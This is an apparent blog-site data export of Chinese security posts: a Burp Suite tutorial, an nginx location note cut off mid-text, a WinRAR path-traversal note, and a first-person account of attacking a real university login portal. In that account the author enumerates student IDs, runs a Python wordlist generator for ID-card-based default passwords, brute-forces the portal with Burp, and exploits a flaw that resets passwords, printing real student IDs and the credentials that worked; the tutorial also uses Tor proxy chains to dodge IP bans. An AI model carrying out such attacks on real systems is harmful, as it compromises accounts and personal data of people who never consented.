<a href=\"https://www.anquanke.com/post/id/85925\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/85925</a><br><br>同理，也可以使用代理链来用tor进行代理(防封ip)<br><img src=\"./image/proxy_chain_01.png\" alt=\"proxy_chain_01\"><br>不稳定，容易出错：SOCKS server general failure<br><br>原因待查。。。</p>\n<h4 id=\"3-返回包修改与抓手机包\"><a href=\"#3-返回包修改与抓手机包\" class=\"headerlink\" title=\"3.返回包修改与抓手机包\"></a>3.返回包修改与抓手机包</h4><h6 id=\"3-1修改返回包\"><a href=\"#3-1修改返回包\" class=\"headerlink\" title=\"3.1修改返回包\"></a>3.1修改返回包</h6><p><img src=\"./image/modify_response.png\" alt=\"modify_response\"><br>点击拦截后, forward会将返回结果拦截，然后自己进行修改。<br><br>再次点击forward将修改完的数据返回给原请求。</p>\n<h6 id=\"3-2抓取手机http流量\"><a href=\"#3-2抓取手机http流量\" class=\"headerlink\" title=\"3.2抓取手机http流量\"></a>3.2抓取手机http流量</h6><p>https需要配置证书，其它一样。<br><br>手机和burp在同一局域网下<br><br><img src=\"./image/intercept_mobile.png\" alt=\"intercept_mobile\"><br>配置burp监听本机ip,端口随意<br><br>到手机设置里面，对连接的wifi进行修改。选择连接的wifi-&gt;显示高级选项-&gt;选择代理(手动)-&gt;<br>配置ip和端口(上一步burp中设置的)-&gt;ip(DHCP)。<br><br>现在可以到burp中进行抓包了<br></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-配置\"><a href=\"#1-配置\" class=\"headerlink\" title=\"1.配置\"></a>1.配置</h4><p>先配置浏览器代理，127.0.0.1：8080，使所有流量都要经过这<br><br>  <img src=\"./image/chrome_proxy.png\" alt=\"proxy_1\"></p>\n<p>  <img src=\"./image/chrome_proxy2.png\" alt=\"proxy_1_1\"></p>\n<p>再配置burpsuite监听这个端口的流量<br><br>  <img src=\"./image/burpsuite_proxy.png\" alt=\"proxy_2\"></p>\n<p>此外 ，因为要访问https,配置完这些后，打开浏览器访问<a href=\"http://burp，下载证书，安装到受信任颁发机构\" target=\"_blank\" rel=\"noopener\">http://burp，下载证书，安装到受信任颁发机构</a><br><br><img src=\"./image/burpsuite_ca_certificate.png\" alt=\"proxy_3\"><br><img src=\"./image/ca_certificate_install.png\" alt=\"proxy_3_1\"></p>\n<h4 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h4><h5 id=\"1-第一个抓包小例子\"><a href=\"#1-第一个抓包小例子\" class=\"headerlink\" title=\"1.第一个抓包小例子\"></a>1.第一个抓包小例子</h5><p>1.先随意搜索后台登录页面,inurl:login.html,在这里我随机找了一个<a href=\"http://usr.005.tv/User/login.html\" target=\"_blank\" rel=\"noopener\">http://usr.005.tv/User/login.html</a><br><img src=\"./image/usr005tv_login_page1.png\" alt=\"login_page_1\"><br>先点击注册<br><img src=\"./image/usr005tv_register1.png\" alt=\"register_page_1\"></p>\n<p><br><br><strong>其中我们邮箱和手机号都是填的假号码。<br>然后开始拦截抓包，滑动滑块</strong></p>\n<p><img src=\"./image/usr005tv_package_1.png\" alt=\"package1\"><br>修改号码为自己手机号，收到验证码<br><img src=\"./image/usr005tv_package_2.png\" alt=\"package1\"><br>输入验证码<br><img src=\"./image/usr005tv_package_3.png\" alt=\"package1\"><br>在这里发现，后端验证时，同时验证了发送验证码的手机号和验证码，所以验证失败，如果在这也修改为自己手机号，那注册时的假号码就无意义了。</p>\n<h5 id=\"2-一个爆破小例子\"><a href=\"#2-一个爆破小例子\" class=\"headerlink\" title=\"2.一个爆破小例子\"></a>2.一个爆破小例子</h5><p>来dvwn的登录（admin/password）<br><img src=\"./image/dvwn_login_1.png\" alt=\"intruder_01\"><br>随便输入，抓取数据包，send to intruder<br><img src=\"./image/burpsuite_intruder_01.png\" alt=\"intruder_02\"><br>选择Cluster模式，可以使用同的字典，进行穷举（笛卡尔积）<br><br>然后，clear清空变量，鼠标选中后，add添加自己需要的变量<br><img src=\"./image/burpsuite_intruder_02.png\" alt=\"intruder_03\"><br>分别添加变量对应的字典，进行爆破<br><img src=\"./image/burpsuite_intruder_03.png\" alt=\"intruder_04\"><br>爆破完成后，点击length，查看length长度(正确的和错误的length长度会不样)<br><img src=\"./image/burpsuite_intruder_04.png\" alt=\"intruder_05\"></p>\n<h4 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h4><p>1.使用burpsuite抓包后，vpn没用了，不能访问外网<br></p>\n<p>解决1，虚拟机里使用burpsuite,nat模式连接，物理机还是挂了vpn<br></p>\n<p>2018/12/20 添加:<br><br>解决2，使用代理链 <a href=\"https://www.anquanke.com/post/id/85925\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/85925</a><br><br>同理，也可以使用代理链来用tor进行代理(防封ip)<br><img src=\"./image/proxy_chain_01.png\" alt=\"proxy_chain_01\"><br>不稳定，容易出错：SOCKS server general failure<br><br>原因待查。。。</p>\n<h4 id=\"3-返回包修改与抓手机包\"><a href=\"#3-返回包修改与抓手机包\" class=\"headerlink\" title=\"3.返回包修改与抓手机包\"></a>3.返回包修改与抓手机包</h4><h6 id=\"3-1修改返回包\"><a href=\"#3-1修改返回包\" class=\"headerlink\" title=\"3.1修改返回包\"></a>3.1修改返回包</h6><p><img src=\"./image/modify_response.png\" alt=\"modify_response\"><br>点击拦截后, forward会将返回结果拦截，然后自己进行修改。<br><br>再次点击forward将修改完的数据返回给原请求。</p>\n<h6 id=\"3-2抓取手机http流量\"><a href=\"#3-2抓取手机http流量\" class=\"headerlink\" title=\"3.2抓取手机http流量\"></a>3.2抓取手机http流量</h6><p>https需要配置证书，其它一样。<br><br>手机和burp在同一局域网下<br><br><img src=\"./image/intercept_mobile.png\" alt=\"intercept_mobile\"><br>配置burp监听本机ip,端口随意<br><br>到手机设置里面，对连接的wifi进行修改。选择连接的wifi-&gt;显示高级选项-&gt;选择代理(手动)-&gt;<br>配置ip和端口(上一步burp中设置的)-&gt;ip(DHCP)。<br><br>现在可以到burp中进行抓包了<br></p>\n"},{"title":"一个渗透小例子","date":"2018-12-18T20:54:01.000Z","_content":"\n看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。\n![indexPage](./index_page.png)\n\n#### 1.找到薄弱点\n官网一般相对安全一点，所以通常从子域名下手。<br>\nchrome搜索，输入: inurl:cdnu.edu.cn\n\n![searchPage](./search_page.png)\n\n看到一个身份认证平台<br>\n一般这些都是后台登录界面<br>\n点进去\n![searchPage](./login_page.png)\n\n可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。\n\n#### 2.信息收集\n为了能进行爆破，先要得到学号。<br>\n直接google和百度.\n![searchPage](./studentid_search_01.png)\n\n![searchPage](./studentid_search_02.png)\n\n![searchPage](./studentid_search_03.png)\n\n可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br>\n\n尝试登录：160003021029/123456<br>\n返回:用户名或密码错误。到这还看不出什么<br>\n再尝试输入: 160000000000/123456<br>\n返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br>\n\n在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br>\n\n接下来该进行爆破了，先生成身份证后六位的密码字典.<br>\n因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.\n```\nimport os\n\n# ##########################\n# 生成身份证后六位的密码字典\n# ##########################\nyear_start = input(\"请输入开始年份(四位): \")\nyear_end = input(\"请输入结束年份(四位):\")\n\nif len(year_start) != 4 or len(year_end) != 4:\n    print(\"输入格式有误\")\n    exit(-1)\nelse:\n    year_count = abs(int(year_end) - int(year_start)) + 1\n    file_path = os.getcwd() + \"/\" + year_start + \"-\" + year_end + \"dict.txt\"\n    f = open(file_path, \"a+\")\n    for index in range(0, year_count):\n        res = []\n        if year_start < year_end:\n            list_temp = []\n            for i in range(0, 10000):\n                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n        else:\n            for i in range(0, 9999):\n                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n    f.close()\n```\n#### 3.进行尝试\n使用burpsuite抓包，然后进行爆破<br>\n没有成功<br>\n换弱密码top100,再次尝试。<br>\n\n![searchPage](./password_success.png)\n\n这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).\n\n![searchPage](./password_modify.png)\n\n出现此界面，修改密码。\n\n![searchPage](./login_success.png)\n\nnice,登录成功。<br>\n\n注销登录，换(160003021030/12345)再次尝试<br>\n发现再次出现修改密码界面。<br>\n160003021030/123 再次尝试，并没此问题.<br>\n\n\n由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br>\n\n\n右击登录按钮，检查元素，查看源代码.<br>\n![searchPage](./code_logic.png)\n\n![searchPage](./code_logic_02.png)\n\n可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br>\n到此，因为没有挂代理，不敢进行下一步操作。\n\n#### 4.事后分析\n- 网站登录没有验证码，给了爆破利用空间。<br>\n- 网站登录返回信息处理失误，应统一返回用户或密码出错。<br>\n- 网站逻辑处理有漏洞，如更改密码不需要旧密码。<br>\n- 网站敏感信息能被看到<br>\n","source":"_posts/security/example/cdnu-example-login.md","raw":"---\ntitle: \"一个渗透小例子\"\ndate: 2018-12-18 15:54:01\ntags: [security]\n---\n\n看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。\n![indexPage](./index_page.png)\n\n#### 1.找到薄弱点\n官网一般相对安全一点，所以通常从子域名下手。<br>\nchrome搜索，输入: inurl:cdnu.edu.cn\n\n![searchPage](./search_page.png)\n\n看到一个身份认证平台<br>\n一般这些都是后台登录界面<br>\n点进去\n![searchPage](./login_page.png)\n\n可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。\n\n#### 2.信息收集\n为了能进行爆破，先要得到学号。<br>\n直接google和百度.\n![searchPage](./studentid_search_01.png)\n\n![searchPage](./studentid_search_02.png)\n\n![searchPage](./studentid_search_03.png)\n\n可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br>\n\n尝试登录：160003021029/123456<br>\n返回:用户名或密码错误。到这还看不出什么<br>\n再尝试输入: 160000000000/123456<br>\n返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br>\n\n在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br>\n\n接下来该进行爆破了，先生成身份证后六位的密码字典.<br>\n因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.\n```\nimport os\n\n# ##########################\n# 生成身份证后六位的密码字典\n# ##########################\nyear_start = input(\"请输入开始年份(四位): \")\nyear_end = input(\"请输入结束年份(四位):\")\n\nif len(year_start) != 4 or len(year_end) != 4:\n    print(\"输入格式有误\")\n    exit(-1)\nelse:\n    year_count = abs(int(year_end) - int(year_start)) + 1\n    file_path = os.getcwd() + \"/\" + year_start + \"-\" + year_end + \"dict.txt\"\n    f = open(file_path, \"a+\")\n    for index in range(0, year_count):\n        res = []\n        if year_start < year_end:\n            list_temp = []\n            for i in range(0, 10000):\n                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n        else:\n            for i in range(0, 9999):\n                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))\n                f.write(\"\\n\")\n            res.append(list_temp)\n    f.close()\n```\n#### 3.进行尝试\n使用burpsuite抓包，然后进行爆破<br>\n没有成功<br>\n换弱密码top100,再次尝试。<br>\n\n![searchPage](./password_success.png)\n\n这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).\n\n![searchPage](./password_modify.png)\n\n出现此界面，修改密码。\n\n![searchPage](./login_success.png)\n\nnice,登录成功。<br>\n\n注销登录，换(160003021030/12345)再次尝试<br>\n发现再次出现修改密码界面。<br>\n160003021030/123 再次尝试，并没此问题.<br>\n\n\n由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br>\n\n\n右击登录按钮，检查元素，查看源代码.<br>\n![searchPage](./code_logic.png)\n\n![searchPage](./code_logic_02.png)\n\n可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br>\n到此，因为没有挂代理，不敢进行下一步操作。\n\n#### 4.事后分析\n- 网站登录没有验证码，给了爆破利用空间。<br>\n- 网站登录返回信息处理失误，应统一返回用户或密码出错。<br>\n- 网站逻辑处理有漏洞，如更改密码不需要旧密码。<br>\n- 网站敏感信息能被看到<br>\n","slug":"security/example/cdnu-example-login","published":1,"updated":"2019-10-13T12:15:12.180Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lr004u6dcp2o656cqa","content":"<p>看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。<br><img src=\"./index_page.png\" alt=\"indexPage\"></p>\n<h4 id=\"1-找到薄弱点\"><a href=\"#1-找到薄弱点\" class=\"headerlink\" title=\"1.找到薄弱点\"></a>1.找到薄弱点</h4><p>官网一般相对安全一点，所以通常从子域名下手。<br><br>chrome搜索，输入: inurl:cdnu.edu.cn</p>\n<p><img src=\"./search_page.png\" alt=\"searchPage\"></p>\n<p>看到一个身份认证平台<br><br>一般这些都是后台登录界面<br><br>点进去<br><img src=\"./login_page.png\" alt=\"searchPage\"></p>\n<p>可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。</p>\n<h4 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h4><p>为了能进行爆破，先要得到学号。<br><br>直接google和百度.<br><img src=\"./studentid_search_01.png\" alt=\"searchPage\"></p>\n<p><img src=\"./studentid_search_02.png\" alt=\"searchPage\"></p>\n<p><img src=\"./studentid_search_03.png\" alt=\"searchPage\"></p>\n<p>可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br></p>\n<p>尝试登录：160003021029/123456<br><br>返回:用户名或密码错误。到这还看不出什么<br><br>再尝试输入: 160000000000/123456<br><br>返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br></p>\n<p>在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br></p>\n<p>接下来该进行爆破了，先生成身份证后六位的密码字典.<br><br>因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># ##########################</span><br><span class=\"line\"># 生成身份证后六位的密码字典</span><br><span class=\"line\"># ##########################</span><br><span class=\"line\">year_start = input(&quot;请输入开始年份(四位): &quot;)</span><br><span class=\"line\">year_end = input(&quot;请输入结束年份(四位):&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if len(year_start) != 4 or len(year_end) != 4:</span><br><span class=\"line\">    print(&quot;输入格式有误&quot;)</span><br><span class=\"line\">    exit(-1)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    year_count = abs(int(year_end) - int(year_start)) + 1</span><br><span class=\"line\">    file_path = os.getcwd() + &quot;/&quot; + year_start + &quot;-&quot; + year_end + &quot;dict.txt&quot;</span><br><span class=\"line\">    f = open(file_path, &quot;a+&quot;)</span><br><span class=\"line\">    for index in range(0, year_count):</span><br><span class=\"line\">        res = []</span><br><span class=\"line\">        if year_start &lt; year_end:</span><br><span class=\"line\">            list_temp = []</span><br><span class=\"line\">            for i in range(0, 10000):</span><br><span class=\"line\">                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            for i in range(0, 9999):</span><br><span class=\"line\">                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-进行尝试\"><a href=\"#3-进行尝试\" class=\"headerlink\" title=\"3.进行尝试\"></a>3.进行尝试</h4><p>使用burpsuite抓包，然后进行爆破<br><br>没有成功<br><br>换弱密码top100,再次尝试。<br></p>\n<p><img src=\"./password_success.png\" alt=\"searchPage\"></p>\n<p>这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).</p>\n<p><img src=\"./password_modify.png\" alt=\"searchPage\"></p>\n<p>出现此界面，修改密码。</p>\n<p><img src=\"./login_success.png\" alt=\"searchPage\"></p>\n<p>nice,登录成功。<br></p>\n<p>注销登录，换(160003021030/12345)再次尝试<br><br>发现再次出现修改密码界面。<br><br>160003021030/123 再次尝试，并没此问题.<br></p>\n<p>由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br></p>\n<p>右击登录按钮，检查元素，查看源代码.<br><br><img src=\"./code_logic.png\" alt=\"searchPage\"></p>\n<p><img src=\"./code_logic_02.png\" alt=\"searchPage\"></p>\n<p>可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br><br>到此，因为没有挂代理，不敢进行下一步操作。</p>\n<h4 id=\"4-事后分析\"><a href=\"#4-事后分析\" class=\"headerlink\" title=\"4.事后分析\"></a>4.事后分析</h4><ul>\n<li>网站登录没有验证码，给了爆破利用空间。<br></li>\n<li>网站登录返回信息处理失误，应统一返回用户或密码出错。<br></li>\n<li>网站逻辑处理有漏洞，如更改密码不需要旧密码。<br></li>\n<li>网站敏感信息能被看到<br></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>看了好久的渗透概念性东西，都没有实践过，今天想试一下，随意找了一个学校官网(自知菜鸟水平，还没入门，不敢找太好的学校)。<br><img src=\"./index_page.png\" alt=\"indexPage\"></p>\n<h4 id=\"1-找到薄弱点\"><a href=\"#1-找到薄弱点\" class=\"headerlink\" title=\"1.找到薄弱点\"></a>1.找到薄弱点</h4><p>官网一般相对安全一点，所以通常从子域名下手。<br><br>chrome搜索，输入: inurl:cdnu.edu.cn</p>\n<p><img src=\"./search_page.png\" alt=\"searchPage\"></p>\n<p>看到一个身份认证平台<br><br>一般这些都是后台登录界面<br><br>点进去<br><img src=\"./login_page.png\" alt=\"searchPage\"></p>\n<p>可以看到，不仅没有验证码，还清楚的告诉你了账号为学号，默认密码为身份证后六位。典型的用于给我们进行爆破。</p>\n<h4 id=\"2-信息收集\"><a href=\"#2-信息收集\" class=\"headerlink\" title=\"2.信息收集\"></a>2.信息收集</h4><p>为了能进行爆破，先要得到学号。<br><br>直接google和百度.<br><img src=\"./studentid_search_01.png\" alt=\"searchPage\"></p>\n<p><img src=\"./studentid_search_02.png\" alt=\"searchPage\"></p>\n<p><img src=\"./studentid_search_03.png\" alt=\"searchPage\"></p>\n<p>可以看到，在搜索一些国内的网站信息时，百度还是要好用一点。<br></p>\n<p>尝试登录：160003021029/123456<br><br>返回:用户名或密码错误。到这还看不出什么<br><br>再尝试输入: 160000000000/123456<br><br>返回：用户名不存在。(由此可知160003021029用户是存在的，同理，可以知道160003021030等等)<br></p>\n<p>在这一步，由于网站的 <strong>不恰当返回信息处理</strong> (用户名枚举)，我们得到了可用用户名.<br></p>\n<p>接下来该进行爆破了，先生成身份证后六位的密码字典.<br><br>因为从学号可看出是2016届的，所以推测生日应该在1997-1999年，这样字典就只有三万条.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\"># ##########################</span><br><span class=\"line\"># 生成身份证后六位的密码字典</span><br><span class=\"line\"># ##########################</span><br><span class=\"line\">year_start = input(&quot;请输入开始年份(四位): &quot;)</span><br><span class=\"line\">year_end = input(&quot;请输入结束年份(四位):&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if len(year_start) != 4 or len(year_end) != 4:</span><br><span class=\"line\">    print(&quot;输入格式有误&quot;)</span><br><span class=\"line\">    exit(-1)</span><br><span class=\"line\">else:</span><br><span class=\"line\">    year_count = abs(int(year_end) - int(year_start)) + 1</span><br><span class=\"line\">    file_path = os.getcwd() + &quot;/&quot; + year_start + &quot;-&quot; + year_end + &quot;dict.txt&quot;</span><br><span class=\"line\">    f = open(file_path, &quot;a+&quot;)</span><br><span class=\"line\">    for index in range(0, year_count):</span><br><span class=\"line\">        res = []</span><br><span class=\"line\">        if year_start &lt; year_end:</span><br><span class=\"line\">            list_temp = []</span><br><span class=\"line\">            for i in range(0, 10000):</span><br><span class=\"line\">                list_temp.append(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_start) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            for i in range(0, 9999):</span><br><span class=\"line\">                list_temp.append(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(str((int(year_end) + index))[-2:] + str(i).zfill(4))</span><br><span class=\"line\">                f.write(&quot;\\n&quot;)</span><br><span class=\"line\">            res.append(list_temp)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"3-进行尝试\"><a href=\"#3-进行尝试\" class=\"headerlink\" title=\"3.进行尝试\"></a>3.进行尝试</h4><p>使用burpsuite抓包，然后进行爆破<br><br>没有成功<br><br>换弱密码top100,再次尝试。<br></p>\n<p><img src=\"./password_success.png\" alt=\"searchPage\"></p>\n<p>这次可以看到密码：12345不一样，进行手动登录尝试(160003021029/12345).</p>\n<p><img src=\"./password_modify.png\" alt=\"searchPage\"></p>\n<p>出现此界面，修改密码。</p>\n<p><img src=\"./login_success.png\" alt=\"searchPage\"></p>\n<p>nice,登录成功。<br></p>\n<p>注销登录，换(160003021030/12345)再次尝试<br><br>发现再次出现修改密码界面。<br><br>160003021030/123 再次尝试，并没此问题.<br></p>\n<p>由此惊讶的猜测测，12345并不是真是密码，而是由于逻辑错误造成的漏洞利用<br></p>\n<p>右击登录按钮，检查元素，查看源代码.<br><br><img src=\"./code_logic.png\" alt=\"searchPage\"></p>\n<p><img src=\"./code_logic_02.png\" alt=\"searchPage\"></p>\n<p>可以看到，因为触发了该界面，可以直接更改密码，且不需要输入密码<br><br>到此，因为没有挂代理，不敢进行下一步操作。</p>\n<h4 id=\"4-事后分析\"><a href=\"#4-事后分析\" class=\"headerlink\" title=\"4.事后分析\"></a>4.事后分析</h4><ul>\n<li>网站登录没有验证码，给了爆破利用空间。<br></li>\n<li>网站登录返回信息处理失误，应统一返回用户或密码出错。<br></li>\n<li>网站逻辑处理有漏洞，如更改密码不需要旧密码。<br></li>\n<li>网站敏感信息能被看到<br></li>\n</ul>\n"},{"_content":"\nwinrar目录穿越\n\nwinrar下载\n官网最新版本：5.71 beta 1\nhttps://www.rarlab.com/rar/winrar-x64-571b1.exe\n根据此规则,下载以前版本:5.50\nhttps://www.rarlab.com/rar/winrar-x64-550.exe\n\n漏洞原理\nhttps://paper.tuisec.win/detail/896098d4d19debb\nwinrar中的UNACE2.dll动态链接库处理文件路径时，通过特殊构造的路径，可以触发目录穿越漏洞。\n利用此漏洞将恶意文件放到windows启动目录下，实现开机自启。\n","source":"_posts/security/vulnerability/winrar目录.md","raw":"\nwinrar目录穿越\n\nwinrar下载\n官网最新版本：5.71 beta 1\nhttps://www.rarlab.com/rar/winrar-x64-571b1.exe\n根据此规则,下载以前版本:5.50\nhttps://www.rarlab.com/rar/winrar-x64-550.exe\n\n漏洞原理\nhttps://paper.tuisec.win/detail/896098d4d19debb\nwinrar中的UNACE2.dll动态链接库处理文件路径时，通过特殊构造的路径，可以触发目录穿越漏洞。\n利用此漏洞将恶意文件放到windows启动目录下，实现开机自启。\n","slug":"security/vulnerability/winrar目录","published":1,"date":"2019-10-13T12:15:12.184Z","updated":"2019-10-13T12:15:12.184Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ls004w6dcp23fmbeni","content":"<p>winrar目录穿越</p>\n<p>winrar下载<br>官网最新版本：5.71 beta 1<br><a href=\"https://www.rarlab.com/rar/winrar-x64-571b1.exe\" target=\"_blank\" rel=\"noopener\">https://www.rarlab.com/rar/winrar-x64-571b1.exe</a><br>根据此规则,下载以前版本:5.50<br><a href=\"https://www.rarlab.com/rar/winrar-x64-550.exe\" target=\"_blank\" rel=\"noopener\">https://www.rarlab.com/rar/winrar-x64-550.exe</a></p>\n<p>漏洞原理<br><a href=\"https://paper.tuisec.win/detail/896098d4d19debb\" target=\"_blank\" rel=\"noopener\">https://paper.tuisec.win/detail/896098d4d19debb</a><br>winrar中的UNACE2.dll动态链接库处理文件路径时，通过特殊构造的路径，可以触发目录穿越漏洞。<br>利用此漏洞将恶意文件放到windows启动目录下，实现开机自启。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>winrar目录穿越</p>\n<p>winrar下载<br>官网最新版本：5.71 beta 1<br><a href=\"https://www.rarlab.com/rar/winrar-x64-571b1.exe\" target=\"_blank\" rel=\"noopener\">https://www.rarlab.com/rar/winrar-x64-571b1.exe</a><br>根据此规则,下载以前版本:5.50<br><a href=\"https://www.rarlab.com/rar/winrar-x64-550.exe\" target=\"_blank\" rel=\"noopener\">https://www.rarlab.com/rar/winrar-x64-550.exe</a></p>\n<p>漏洞原理<br><a href=\"https://paper.tuisec.win/detail/896098d4d19debb\" target=\"_blank\" rel=\"noopener\">https://paper.tuisec.win/detail/896098d4d19debb</a><br>winrar中的UNACE2.dll动态链接库处理文件路径时，通过特殊构造的路径，可以触发目录穿越漏洞。<br>利用此漏洞将恶意文件放到windows启动目录下，实现开机自启。</p>\n"},{"title":"location模块","date":"2019-07-19T18:54:32.000Z","_content":"\n测试所用版本:\n```\nroot@localhost:~# nginx -v\nnginx version: nginx/1.10.3 (Ubuntu)\n```\n# 一. Location表达式\n\n <strong> location [ = | \\~ | \\~\\* | ^~ | @ ] /uri/ { … } </strong>\n- /{}\n\n  无前缀，表示最大前缀匹配.\n\n- @\n\n  几乎见不到，不用管\n\n- =\n\n 完全匹配<br>\n url部分为啥就精确匹配啥.\n\n\n ```\n# 1\nlocation = /t1 {\n      return 601;\n}\n# 2\nlocation = /t2 {\n        return 602;\n}\n# 3\nlocation = /t1/ {\n        return 603;\n}\n ```\n 例子:<br>\nhttp://67.216.218.49:8080/t1 601\n\nhttp://67.216.218.49:8080/t2 602\n\nhttp://67.216.218.49:8080/t 404\n\n加上条件3前<br>\nhttp://67.216.218.49:8080/t1/ 404<br>\n加上条件3后<br>\nhttp://67.216.218.49:8080/t1/ 603\n\n- \\~\n\n正则,大小写敏感\n```\nlocation ~ /T1 {\n       return 601;\n}\nlocation ~ /t1 {\n       return 603;\n}\n```\nhttp://67.216.218.49:8080/t1 603<br>\n自动转为了 小写?<br>\nhttp://67.216.218.49:8080/T1 603\n\n```\nlocation ~ /T1/TT {\n       return 601;\n}\nlocation ~ 